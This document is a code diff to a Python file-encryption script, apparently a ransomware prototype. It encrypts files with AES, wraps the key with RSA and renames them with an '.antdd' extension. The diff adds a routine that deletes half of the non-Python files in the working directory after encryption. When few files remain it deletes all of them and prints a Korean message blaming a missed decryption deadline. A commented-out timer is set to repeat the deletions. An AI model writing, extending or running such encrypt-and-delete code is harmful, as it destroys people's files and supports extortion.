@@ -1,9 +1,12 @@
+from builtins import int, input, len, round, range
+
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from Crypto import Random  #RSA 키 생성시 필요
 from Crypto.Cipher import PKCS1_OAEP #RSA 최신버전(보안더좋음)
 import glob
 import os
+import threading
 
 def list_files(path, ext=None):
     filelist=[]
@@ -19,6 +22,45 @@ def list_files(path, ext=None):
 
     print("filelist: \n", filelist)
     return filelist
+'''
+def startTimer():
+    print("파일의 반이 삭제됩니다.")
+    #5초에 한번씩 파일 삭제
+    timer=threading.Timer(5,remove_files(os.getcwd()))
+    timer.start()
+'''
+
+def remove_files(path,ext=None):
+    remove_filelist=[]
+    print("os.removelistdir(): \n", os.listdir())
+    for name in os.listdir(path):
+        if os.path.isfile(os.path.join(path, name)):
+            if name.endswith('.py'):
+                continue
+            if (ext == None):
+                remove_filelist.append(name)
+            elif name.endswith(ext):
+                remove_filelist.append(name)
+    print("remove_filelist: \n", remove_filelist)
+
+    if(len(remove_filelist)>2):
+        if((len(remove_filelist) / 2 ) % 2 == 0):
+            n=round(len(remove_filelist)/2) #정수로 변환
+            print("지울 파일 개수: ", n)
+        else:
+            n=round(len(remove_filelist)/2)-1
+            print("지울 파일 개수: ", n)
+
+        for i in range(n):
+            print(remove_filelist[i])
+            os.remove(remove_filelist[i])
+        print("파일 중 절반이 삭제되었습니다.")
+
+    else:
+        for i in range(2):
+            os.remove(remove_filelist[i])
+        print("시간 내에 복호화를 하지 못하여 모든 파일이 삭제되었습니다.")
+
 
 def get_tmp(in_filename):
     tmp = b''
@@ -158,9 +200,9 @@ def enc(key, cipher, in_filename, out_filename=None):
 
         #이어쓰기 모드
         with open(out_filename, 'ab') as outfile:
-            #RSA : 길이 64825 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
+            #RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
             outfile.write(b'0'*(64832-len(str(sizeOfData)))+str(sizeOfData).encode())
-            print(b'0'*(64832-sizeOfData)+str(sizeOfData).encode())
+            print('\ndata size : ',len(b'0'*(64832-len(str(sizeOfData)))+str(sizeOfData).encode()))
             #RSA : 암호화된 AES 키를 넣어줌 (128바이트)
             outfile.write(ciphertext)
             encryptor = AES.new(key, mode, iv)
@@ -178,7 +220,7 @@ def enc(key, cipher, in_filename, out_filename=None):
         print(result.read())
 
     print("---END ENCRYPTION : AES")
-def dec(x, cipher, in_filename, out_filename):
+def dec( cipher, in_filename, out_filename):
     print("---START DECRYPTION : AES")
 
     mode = AES.MODE_CBC
@@ -190,9 +232,9 @@ def dec(x, cipher, in_filename, out_filename):
 
     with open(in_filename, 'rb') as infile:
         e_data = infile.read()
-
+        print('size : ',e_data[:64832])
         #RSA : 파일의 크기와 암호화된 AES 키 추출
-        sizeOfData = e_data[:64832]
+        sizeOfData = int(e_data[:64832].lstrip(b'0').decode())
         aes_key_enc = e_data[64832:64960]  # 암호화된 aes 키
         print(len(aes_key_enc), aes_key_enc)
         #RSA : 암호화된 진짜 원본 데이터 추출
@@ -212,10 +254,12 @@ def dec(x, cipher, in_filename, out_filename):
             print("2. before unpadding d_data")
             print(d_data)
 
+
+            d_data = d_data[:sizeOfData]
             # 패딩 처리한 부분을 다시 지워준다
             # d_data = e_data[:-x[-1]] 에서 x[-1]의 값은 100
             # 바이트 크기로 인식하기 때문에 d->ascii->100
-            d_data = d_data[:d_data.rfind(x[-1]) + 1]
+            #d_data = d_data[:d_data.rfind(x[-1]) + 1]
 
             #####print("어쩌구 후 d_data: ", d_data.decode('ascii'))
             ##target의 내용이 한글인 경우 에러발생
@@ -248,7 +292,7 @@ def test_jw(in_filename):
     x = get_tmp(in_filename)
     enc(key, cipher, in_filename, out_filename='target_enc.antdd')
     print("")
-    dec(x, key, cipher, 'target_enc.antdd', out_filename='target_test.txt')
+    dec(key, cipher, 'target_enc.antdd', out_filename='target_test.txt')
 
 
 ##def text(key, in_filename):
@@ -286,6 +330,8 @@ if __name__ == "__main__":
                 if enc_target.split('.')[-1]=='antdd':
                     continue
                 enc(key, cipher,enc_target, out_filename=None)
+                #startTimer()
+                remove_files(os.getcwd())
         elif (menu == 2):
             dec_targetlist = list_files(os.getcwd(), '.antdd')
             print("dec_targetlist: \n", dec_targetlist)
